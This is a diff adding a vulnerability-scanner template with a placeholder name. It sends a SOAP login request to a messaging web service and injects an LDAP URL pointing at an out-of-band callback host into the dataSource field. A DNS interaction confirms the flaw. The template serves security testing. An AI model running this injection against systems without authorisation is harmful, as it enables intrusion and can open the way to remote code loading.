@@ -1,0 +1,39 @@
+id: need_to_change
+
+info:
+  name: need_to_change
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Connection: close
+        Content-type: application/x-www-form-urlencoded
+        SOAPAction: urn:loginNC
+        Accept-Encoding: gzip
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <ims:loginNC>
+                <!--type: string-->
+                <dataSource>ldap://{{interactsh-url}}</dataSource>
+                <!--type: string-->
+                <usercode>sonoras imperio</usercode>
+                <!--type: string-->
+                <password>quae divum incedo</password>
+            </ims:loginNC>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
